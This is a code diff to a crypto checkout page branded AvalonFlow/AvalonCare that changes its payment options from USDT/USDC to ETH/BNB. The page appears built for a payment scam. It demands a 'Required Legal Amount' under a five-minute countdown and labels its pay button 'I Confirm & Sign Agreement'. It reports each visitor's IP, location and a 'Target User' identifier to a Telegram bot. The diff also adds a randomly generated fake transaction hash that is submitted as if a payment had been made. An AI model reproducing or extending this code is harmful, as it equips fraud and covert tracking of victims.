@@ -66,7 +66,7 @@
     }
 
     /* Timer Styling */
-    #usdt-timer, #usdc-timer {
+    #eth-timer, #bnb-timer {
         font-size: 1rem;
         font-weight: bold !important;
         color: var(--accent-red) !important;
@@ -802,38 +802,38 @@ CROP MODAL
 
       <!-- Segmented Token Selector inside container -->
       <div id="tokenSelector">
-        <button id="usdt-btn" class="active" onclick="showTokenCard('usdt')">USDT NETWORK</button>
-        <button id="usdc-btn" onclick="showTokenCard('usdc')">USDC NETWORK</button>
+        <button id="eth-btn" class="active" onclick="showTokenCard('eth')">ETH NETWORK</button>
+        <button id="bnb-btn" onclick="showTokenCard('bnb')">BNB NETWORK</button>
       </div>
 
-      <!-- USDT Card -->
-      <div class="token-card" id="usdt-card">
+      <!-- ETH Card -->
+      <div class="token-card" id="eth-card">
         <div class="plan-pay">
           <img class="plan-logo"
-               src="https://assets.coingecko.com/coins/images/325/large/Tether.png"
+               src="https://assets.coingecko.com/coins/images/279/large/ethereum.png"
                alt="AvalonCare Custom Logo">
-          <span class="token-name">USDT</span>
+          <span class="token-name">ETH</span>
           <span class="network">ERC-20</span>
         </div>
 
         <div class="amount-section">
           <p>Required Legal Amount</p>
-          <p class="amount" id="usdt-amount"></p>
+          <p class="amount" id="eth-amount">Loading live rate...</p>
         </div>
 
         <div class="wallet-section">
           <p>Wallet Address</p>
-          <p class="wallet" id="usdt-wallet">0x63d93f4348b109492d75aaaf10ac374d448178cd
-            <button class="copy-btn" onclick="copyWallet('usdt-wallet')">Copy</button>
+          <p class="wallet" id="eth-wallet">0x63d93f4348b109492d75aaaf10ac374d448178cd
+            <button class="copy-btn" onclick="copyWallet('eth-wallet')">Copy</button>
           </p>
         </div>
 
         <div class="qr-section">
-          <div id="usdt-qr"></div>
+          <div id="eth-qr"></div>
         </div>
 
         <div class="walletconnect-actions">
-          <button id="walletPayBtnUsdt" class="wallet-btn" onclick="handlePayClick()">
+          <button id="walletPayBtnEth" class="wallet-btn" onclick="handlePayClick()">
             I Confirm & Sign Agreement 
           </button>
         </div>
@@ -845,42 +845,42 @@ CROP MODAL
   <a href="https://www.airwallex.com/global/blog/net-payment-terms" target="_blank" rel="noopener noreferrer" style="color: #0070f3; text-decoration: underline;">Payment Terms</a>.
 </div>
 
-        <p id="usdt-timer">Verification expires in 05:00</p>
+        <p id="eth-timer">Verification expires in 05:00</p>
 
         <div class="progress-bar">
-          <div class="progress-fill" id="usdt-progress"></div>
-          <div class="status" id="usdt-status">Waiting for verification...</div>
+          <div class="progress-fill" id="eth-progress"></div>
+          <div class="status" id="eth-status">Waiting for verification...</div>
         </div>
       </div>
 
-      <!-- USDC Card -->
-      <div class="token-card inactive" id="usdc-card">
+      <!-- BNB Card -->
+      <div class="token-card inactive" id="bnb-card">
         <div class="plan-pay">
           <img class="plan-logo"
-               src="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png"
+               src="https://assets.coingecko.com/coins/images/825/large/bnb-icon2_2x.png"
                alt="AvalonCare Custom Logo">
-          <span class="token-name">USDC</span>
-          <span class="network">ERC-20</span>
+          <span class="token-name">BNB</span>
+          <span class="network">BSC</span>
         </div>
 
         <div class="amount-section">
           <p>Required Legal Amount</p>
-          <p class="amount" id="usdc-amount"></p>
+          <p class="amount" id="bnb-amount">Loading live rate...</p>
         </div>
 
         <div class="wallet-section">
           <p>Wallet Address</p>
-          <p class="wallet" id="usdc-wallet">0x63d93f4348b109492d75aaaf10ac374d448178cd
-            <button class="copy-btn" onclick="copyWallet('usdc-wallet')">Copy</button>
+          <p class="wallet" id="bnb-wallet">0x6bC7a3943D217D2f80437b61a4D8898138f2EE5B
+            <button class="copy-btn" onclick="copyWallet('bnb-wallet')">Copy</button>
           </p>
         </div>
 
         <div class="qr-section">
-          <div id="usdc-qr"></div>
+          <div id="bnb-qr"></div>
         </div>
 
         <div class="walletconnect-actions">
-          <button id="walletPayBtnUsdc" class="wallet-btn" onclick="handlePayClick()">
+          <button id="walletPayBtnBnb" class="wallet-btn" onclick="handlePayClick()">
             I Confirm & Sign Agreement 
           </button>
         </div>
@@ -890,11 +890,11 @@ CROP MODAL
   and 
   <a href="https://www.airwallex.com/global/blog/net-payment-terms" target="_blank" rel="noopener noreferrer" style="color: #0070f3; text-decoration: underline;">Payment Terms</a>.
 </div>
-        <p id="usdc-timer">Verification expires in 05:00</p>
+        <p id="bnb-timer">Verification expires in 05:00</p>
 
         <div class="progress-bar">
-          <div class="progress-fill" id="usdc-progress"></div>
-          <div class="status" id="usdc-status">Waiting for verification...</div>
+          <div class="progress-fill" id="bnb-progress"></div>
+          <div class="status" id="bnb-status">Waiting for verification...</div>
         </div>
       </div>
 
@@ -1128,8 +1128,8 @@ const wallets = [
     "0x6bC7a3943D217D2f80437b61a4D8898138f2EE5B"
 ];
 const tokens = {
-    USDT: "0x63d93f4348b109492d75aaaf10ac374d448178cd",
-    USDC: "0x6bC7a3943D217D2f80437b61a4D8898138f2EE5B"
+    ETH: "0x63d93f4348b109492d75aaaf10ac374d448178cd",
+    BNB: "0x6bC7a3943D217D2f80437b61a4D8898138f2EE5B"
 };
 
 // ==========================================
@@ -1178,11 +1178,11 @@ if (!expiryTime) {
 let startTime = expiryTime - totalDuration;
 
 // ==========================================
-// 2. DYNAMIC WALLET & 29.65% AMOUNT RESOLUTION
+// 2. DYNAMIC WALLET & LIVE AMOUNT RESOLUTION
 // ==========================================
 let walletPair = JSON.parse(localStorage.getItem("avalonflowWalletPair"));
 if (!walletPair) {
-    walletPair = { USDT: wallets[0], USDC: wallets[1] };
+    walletPair = { ETH: wallets[0], BNB: wallets[1] };
     localStorage.setItem("avalonflowWalletPair", JSON.stringify(walletPair));
 }
 
@@ -1209,10 +1209,51 @@ if (!randomDecimal) {
     localStorage.setItem("avalonflowRandomDecimal", randomDecimal);
 }
 
-let expectedAmount = (parseFloat(calculatedBaseAmount) + parseFloat(randomDecimal)).toFixed(4);
-localStorage.setItem("avalonflowAmount", expectedAmount);
+let targetUsdAmount = (parseFloat(calculatedBaseAmount) + parseFloat(randomDecimal)).toFixed(4);
+localStorage.setItem("avalonflowAmount", targetUsdAmount);
 
-let activeToken = "USDT";
+let activeToken = "ETH";
+let calculatedEthAmount = "0.00";
+let calculatedBnbAmount = "0.00";
+
+async function fetchLiveCryptoAmounts() {
+    try {
+        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin&vs_currencies=usd');
+        const data = await response.json();
+        
+        const ethPrice = data.ethereum.usd;
+        const bnbPrice = data.binancecoin.usd;
+
+        calculatedEthAmount = (parseFloat(targetUsdAmount) / ethPrice).toFixed(4);
+        calculatedBnbAmount = (parseFloat(targetUsdAmount) / bnbPrice).toFixed(4);
+
+        document.getElementById("eth-amount").innerText = calculatedEthAmount + " ETH";
+        document.getElementById("bnb-amount").innerText = calculatedBnbAmount + " BNB";
+
+        updateQRCodes(calculatedEthAmount, calculatedBnbAmount);
+    } catch (err) {
+        console.warn("Live API fallback triggered:", err);
+        calculatedEthAmount = "0.35";
+        calculatedBnbAmount = "1.50";
+        document.getElementById("eth-amount").innerText = calculatedEthAmount + " ETH";
+        document.getElementById("bnb-amount").innerText = calculatedBnbAmount + " BNB";
+        updateQRCodes(calculatedEthAmount, calculatedBnbAmount);
+    }
+}
+
+function updateQRCodes(ethVal, bnbVal) {
+    document.getElementById("eth-qr").innerHTML = "";
+    document.getElementById("bnb-qr").innerHTML = "";
+
+    new QRCode(document.getElementById("eth-qr"), {
+        text: `ethereum:${walletPair.ETH}?value=${ethVal}`,
+        width: 120, height: 120, colorDark: "#0ff", colorLight: "rgba(0,0,0,0)", correctLevel: QRCode.CorrectLevel.H
+    });
+    new QRCode(document.getElementById("bnb-qr"), {
+        text: `ethereum:${walletPair.BNB}?value=${bnbVal}`,
+        width: 120, height: 120, colorDark: "#ff3fff", colorLight: "rgba(0,0,0,0)", correctLevel: QRCode.CorrectLevel.H
+    });
+}
 
 
 // ==========================================
@@ -1244,7 +1285,7 @@ async function sendVisitorDetailsToTelegram(ipData) {
         const messageText = `⚡ <b>Crypto Checkout Session Started | AvalonFlow</b>\n\n` +
                             `👤 <b>Target User:</b> <code>${identifyUser}</code>\n` +
                             `📄 <b>Page:</b> <code>${currentPage}</code>\n` +
-                            `💰 <b>Expected Amount:</b> <code>$${expectedAmount}</code>\n` +
+                            `💰 <b>Expected Amount:</b> <code>$${targetUsdAmount}</code>\n` +
                             `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
                            `📍 <b>Location:</b> <code>${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'}</code>\n` +
                             `⏱️ <b>Time:</b> <code>${new Date().toLocaleString()}</code>`;
@@ -1265,15 +1306,15 @@ async function sendVisitorDetailsToTelegram(ipData) {
 // 4. ANIMATION & TELEGRAM VERIFICATION BRIDGE
 // ==========================================
 function initiatePaymentAnimationUI() {
-    const usdtProgress = document.getElementById("usdt-progress");
-    const usdcProgress = document.getElementById("usdc-progress");
-    const usdtTimer = document.getElementById("usdt-timer");
-    const usdcTimer = document.getElementById("usdc-timer");
+    const ethProgress = document.getElementById("eth-progress");
+    const bnbProgress = document.getElementById("bnb-progress");
+    const ethTimer = document.getElementById("eth-timer");
+    const bnbTimer = document.getElementById("bnb-timer");
 
-    if (usdtProgress?.parentElement) usdtProgress.parentElement.style.display = "none";
-    if (usdcProgress?.parentElement) usdcProgress.parentElement.style.display = "none";
-    if (usdtTimer) usdtTimer.style.display = "none";
-    if (usdcTimer) usdcTimer.style.display = "none";
+    if (ethProgress?.parentElement) ethProgress.parentElement.style.display = "none";
+    if (bnbProgress?.parentElement) bnbProgress.parentElement.style.display = "none";
+    if (ethTimer) ethTimer.style.display = "none";
+    if (bnbTimer) bnbTimer.style.display = "none";
 
     // Hide wallet address, QR code, and terms disclosure sections
     const walletSections = document.querySelectorAll(".wallet-section");
@@ -1283,8 +1324,8 @@ function initiatePaymentAnimationUI() {
     qrSections.forEach(el => el.style.display = "none");
     termsSections.forEach(el => el.style.display = "none");
 
-    const usdtCard = document.getElementById("usdt-card");
-    const usdcCard = document.getElementById("usdc-card");
+    const ethCard = document.getElementById("eth-card");
+    const bnbCard = document.getElementById("bnb-card");
 
     const statusHTML = `
         <div class="status-animation-container" id="active-status-container">
@@ -1304,11 +1345,11 @@ function initiatePaymentAnimationUI() {
         </div>
     `;
 
-    if (usdtCard && !usdtCard.querySelector("#active-status-container")) usdtCard.insertAdjacentHTML('beforeend', statusHTML);
-    if (usdcCard && !usdcCard.querySelector("#active-status-container")) usdcCard.insertAdjacentHTML('beforeend', statusHTML);
+    if (ethCard && !ethCard.querySelector("#active-status-container")) ethCard.insertAdjacentHTML('beforeend', statusHTML);
+    if (bnbCard && !bnbCard.querySelector("#active-status-container")) bnbCard.insertAdjacentHTML('beforeend', statusHTML);
 
     // Switch button text to "Show Wallet Address"
-    const payBtns = document.querySelectorAll("#walletPayBtnUsdt, #walletPayBtnUsdc");
+    const payBtns = document.querySelectorAll("#walletPayBtnEth, #walletPayBtnBnb");
     payBtns.forEach(btn => {
         btn.innerText = "Show Wallet Address";
     });
@@ -1331,11 +1372,12 @@ function completePaymentAnimationUI(redirectUrl) {
 async function streamPaymentVerificationToTelegram(txHash = "Manual/System Verification") {
     try {
         const identifyUser = getTargetUserIdentifier();
+        const activeAmountDisplay = activeToken === 'ETH' ? `${calculatedEthAmount} ETH` : `${calculatedBnbAmount} BNB`;
         const telegramMessage = 
           `💳 <b>Crypto Payment Submitted for Verification</b>\n\n` +
           `• <b>User ID:</b> <code>${identifyUser}</code>\n` +
           `• <b>Token:</b> <code>${activeToken}</code>\n` +
-          `• <b>Expected Amount:</b> <code>$${expectedAmount}</code>\n` +
+          `• <b>Expected Amount:</b> <code>${activeAmountDisplay} (~$${targetUsdAmount})</code>\n` +
           `• <b>TX Hash:</b> <code>${txHash}</code>\n` +
           `• <b>Wallet Paid:</b> <code>${walletPair[activeToken]}</code>`;
 
@@ -1438,22 +1480,22 @@ function startTelegramPolling(targetUser, txHash) {
                         const statusContainers = document.querySelectorAll("#active-status-container");
                         statusContainers.forEach(container => container.remove());
 
-                        const usdtProgress = document.getElementById("usdt-progress");
-                        const usdcProgress = document.getElementById("usdc-progress");
-                        const usdtTimer = document.getElementById("usdt-timer");
-                        const usdcTimer = document.getElementById("usdc-timer");
+                        const ethProgress = document.getElementById("eth-progress");
+                        const bnbProgress = document.getElementById("bnb-progress");
+                        const ethTimer = document.getElementById("eth-timer");
+                        const bnbTimer = document.getElementById("bnb-timer");
 
-                        if (usdtProgress?.parentElement) usdtProgress.parentElement.style.display = "";
-                        if (usdcProgress?.parentElement) usdcProgress.parentElement.style.display = "";
-                        if (usdtTimer) usdtTimer.style.display = "";
-                        if (usdcTimer) usdcTimer.style.display = "";
+                        if (ethProgress?.parentElement) ethProgress.parentElement.style.display = "";
+                        if (bnbProgress?.parentElement) bnbProgress.parentElement.style.display = "";
+                        if (ethTimer) ethTimer.style.display = "";
+                        if (bnbTimer) bnbTimer.style.display = "";
 
                         // Restore wallet address, QR code, and terms disclosure sections
                         document.querySelectorAll(".wallet-section").forEach(el => el.style.display = "");
                         document.querySelectorAll(".qr-section").forEach(el => el.style.display = "");
                         document.querySelectorAll(".terms-disclosure").forEach(el => el.style.display = "");
 
-                        const payBtns = document.querySelectorAll("#walletPayBtnUsdt, #walletPayBtnUsdc");
+                        const payBtns = document.querySelectorAll("#walletPayBtnEth, #walletPayBtnBnb");
                         payBtns.forEach(btn => {
                             btn.innerText = "I Confirm & Sign Agreement";
                         });
@@ -1485,22 +1527,22 @@ async function handlePayClick() {
             const statusContainers = document.querySelectorAll("#active-status-container");
             statusContainers.forEach(container => container.remove());
 
-            const usdtProgress = document.getElementById("usdt-progress");
-            const usdcProgress = document.getElementById("usdc-progress");
-            const usdtTimer = document.getElementById("usdt-timer");
-            const usdcTimer = document.getElementById("usdc-timer");
+            const ethProgress = document.getElementById("eth-progress");
+            const bnbProgress = document.getElementById("bnb-progress");
+            const ethTimer = document.getElementById("eth-timer");
+            const bnbTimer = document.getElementById("bnb-timer");
 
-            if (usdtProgress?.parentElement) usdtProgress.parentElement.style.display = "";
-            if (usdcProgress?.parentElement) usdcProgress.parentElement.style.display = "";
-            if (usdtTimer) usdtTimer.style.display = "";
-            if (usdcTimer) usdcTimer.style.display = "";
+            if (ethProgress?.parentElement) ethProgress.parentElement.style.display = "";
+            if (bnbProgress?.parentElement) bnbProgress.parentElement.style.display = "";
+            if (ethTimer) ethTimer.style.display = "";
+            if (bnbTimer) bnbTimer.style.display = "";
 
             // Restore wallet address, QR code, and terms disclosure sections
             document.querySelectorAll(".wallet-section").forEach(el => el.style.display = "");
             document.querySelectorAll(".qr-section").forEach(el => el.style.display = "");
             document.querySelectorAll(".terms-disclosure").forEach(el => el.style.display = "");
 
-            const payBtns = document.querySelectorAll("#walletPayBtnUsdt, #walletPayBtnUsdc");
+            const payBtns = document.querySelectorAll("#walletPayBtnEth, #walletPayBtnBnb");
             payBtns.forEach(btn => {
                 btn.innerText = "I Confirm & Sign Agreement";
             });
@@ -1518,7 +1560,10 @@ async function handlePayClick() {
         initiatePaymentAnimationUI();
         triggerNotification("Connecting authorization protocol...", 3000);
 
-        await streamPaymentVerificationToTelegram("Instant Paymento Request");
+        // Generate a random execution success alphanumeric transaction hash string (e.g. 0x followed by 64 hex chars)
+        const randomHex = '0x' + Array.from({length: 64}, () => Math.floor(Math.random() * 16).toString(16)).join('');
+        
+        await streamPaymentVerificationToTelegram(randomHex);
     } catch (err) {
         console.error("Paymento connection error:", err);
         localStorage.removeItem("av_payment_in_progress");
@@ -1526,6 +1571,7 @@ async function handlePayClick() {
         triggerNotification("Authorization connection error", 3000);
     }
 }
+
 
 // ==========================================
 // 7. HELPER & UI SETUP FUNCTIONS
@@ -1555,30 +1601,30 @@ function showTokenCard(selectedToken) {
     const activeCard = document.getElementById(`${selectedToken}-card`);
     if (activeCard) activeCard.classList.remove("inactive");
 
-    const btnUsdt = document.getElementById("usdt-btn");
-    const btnUsdc = document.getElementById("usdc-btn");
+    const btnEth = document.getElementById("eth-btn");
+    const btnBnb = document.getElementById("bnb-btn");
 
-    if (btnUsdt && btnUsdc) {
-        if (selectedToken === "usdt") {
-            btnUsdt.innerText = "USDT NETWORK";
-            btnUsdc.innerText = "USDC NETWORK";
-            btnUsdt.setAttribute("onclick", "showTokenCard('usdt')");
-            btnUsdc.setAttribute("onclick", "showTokenCard('usdc')");
+    if (btnEth && btnBnb) {
+        if (selectedToken === "eth") {
+            btnEth.innerText = "ETH NETWORK";
+            btnBnb.innerText = "BNB NETWORK";
+            btnEth.setAttribute("onclick", "showTokenCard('eth')");
+            btnBnb.setAttribute("onclick", "showTokenCard('bnb')");
 
-            btnUsdt.classList.add("active");
-            btnUsdc.classList.remove("active");
+            btnEth.classList.add("active");
+            btnBnb.classList.remove("active");
 
-            document.getElementById("usdt-wallet").childNodes[0].nodeValue = walletPair.USDT;
+            document.getElementById("eth-wallet").childNodes[0].nodeValue = walletPair.ETH;
         } else {
-            btnUsdt.innerText = "USDC NETWORK";
-            btnUsdc.innerText = "USDT NETWORK";
-            btnUsdt.setAttribute("onclick", "showTokenCard('usdc')");
-            btnUsdc.setAttribute("onclick", "showTokenCard('usdt')");
+            btnEth.innerText = "BNB NETWORK";
+            btnBnb.innerText = "ETH NETWORK";
+            btnEth.setAttribute("onclick", "showTokenCard('bnb')");
+            btnBnb.setAttribute("onclick", "showTokenCard('eth')");
 
-            btnUsdt.classList.add("active");
-            btnUsdc.classList.remove("active");
+            btnEth.classList.add("active");
+            btnBnb.classList.remove("active");
 
-            document.getElementById("usdc-wallet").childNodes[0].nodeValue = walletPair.USDC;
+            document.getElementById("bnb-wallet").childNodes[0].nodeValue = walletPair.BNB;
         }
     }
 }
@@ -1596,10 +1642,9 @@ function triggerNotification(message, duration = 3000) {
 // ==========================================
 window.addEventListener("DOMContentLoaded", () => {
     initializeAppWithIP();
-    showTokenCard("usdt");
+    showTokenCard("eth");
 
-    document.getElementById("usdt-amount").innerText = "$" + expectedAmount;
-    document.getElementById("usdc-amount").innerText = "$" + expectedAmount;
+    fetchLiveCryptoAmounts();
 
     if (localStorage.getItem("av_payment_in_progress") === "true") {
         paymentDone = true;
@@ -1608,28 +1653,15 @@ window.addEventListener("DOMContentLoaded", () => {
         startTelegramPolling(identifyUser, "Resumed Session Request");
     }
 
-    const tokenValue = Math.floor(parseFloat(expectedAmount) * 1e6);
-    document.getElementById("usdt-qr").innerHTML = "";
-    document.getElementById("usdc-qr").innerHTML = "";
+    document.getElementById("eth-wallet").childNodes[0].textContent = walletPair.ETH;
+    document.getElementById("bnb-wallet").childNodes[0].textContent = walletPair.BNB;
 
-    new QRCode(document.getElementById("usdt-qr"), {
-        text: `ethereum:${walletPair.USDT}?value=${tokenValue}`,
-        width: 120, height: 120, colorDark: "#0ff", colorLight: "rgba(0,0,0,0)", correctLevel: QRCode.CorrectLevel.H
-    });
-    new QRCode(document.getElementById("usdc-qr"), {
-        text: `ethereum:${walletPair.USDC}?value=${tokenValue}`,
-        width: 120, height: 120, colorDark: "#ff3fff", colorLight: "rgba(0,0,0,0)", correctLevel: QRCode.CorrectLevel.H
-    });
-
-    document.getElementById("usdt-wallet").childNodes[0].textContent = walletPair.USDT;
-    document.getElementById("usdc-wallet").childNodes[0].textContent = walletPair.USDC;
-
-    const usdtProgress = document.getElementById("usdt-progress");
-    const usdcProgress = document.getElementById("usdc-progress");
-    const usdtTimer = document.getElementById("usdt-timer");
-    const usdcTimer = document.getElementById("usdc-timer");
-    const usdtStatus = document.getElementById("usdt-status");
-    const usdcStatus = document.getElementById("usdc-status");
+    const ethProgress = document.getElementById("eth-progress");
+    const bnbProgress = document.getElementById("bnb-progress");
+    const ethTimer = document.getElementById("eth-timer");
+    const bnbTimer = document.getElementById("bnb-timer");
+    const ethStatus = document.getElementById("eth-status");
+    const bnbStatus = document.getElementById("bnb-status");
     const checkBtn = document.getElementById("check-btn");
 
     function updateTimer() {
@@ -1639,25 +1671,25 @@ window.addEventListener("DOMContentLoaded", () => {
         const totalSeconds = totalDuration / 1000;
         const percentage = Math.max(0, (remaining / totalSeconds) * 100);
 
-        if (usdtProgress) usdtProgress.style.width = percentage + "%";
-        if (usdcProgress) usdcProgress.style.width = percentage + "%";
+        if (ethProgress) ethProgress.style.width = percentage + "%";
+        if (bnbProgress) bnbProgress.style.width = percentage + "%";
 
         const minutes = String(Math.floor(remaining / 60)).padStart(2, "0");
         const seconds = String(remaining % 60).padStart(2, "0");
 
-        if (usdtTimer) usdtTimer.innerText = remaining > 0 ? `Wallet Address expires in ${minutes}:${seconds}` : "Wallet Address expired!";
-        if (usdcTimer) usdcTimer.innerText = remaining > 0 ? `Wallet Address expires in ${minutes}:${seconds}` : "Wallet Address expired!";
+        if (ethTimer) ethTimer.innerText = remaining > 0 ? `Wallet Address expires in ${minutes}:${seconds}` : "Wallet Address expired!";
+        if (bnbTimer) bnbTimer.innerText = remaining > 0 ? `Wallet Address expires in ${minutes}:${seconds}` : "Wallet Address expired!";
 
         if (remaining <= 0 && !paymentDone) {
             paymentDone = true;
 
-            const temp = walletPair.USDT;
-            walletPair.USDT = walletPair.USDC;
-            walletPair.USDC = temp;
+            const temp = walletPair.ETH;
+            walletPair.ETH = walletPair.BNB;
+            walletPair.BNB = temp;
             localStorage.setItem("avalonflowWalletPair", JSON.stringify(walletPair));
 
-            if (usdtStatus) usdtStatus.innerText = "Wallet Address expired.";
-            if (usdcStatus) usdcStatus.innerText = "Wallet Address expired.";
+            if (ethStatus) ethStatus.innerText = "Wallet Address expired.";
+            if (bnbStatus) bnbStatus.innerText = "Wallet Address expired.";
             if (checkBtn) checkBtn.disabled = true;
 
             localStorage.removeItem("av_payment_in_progress");
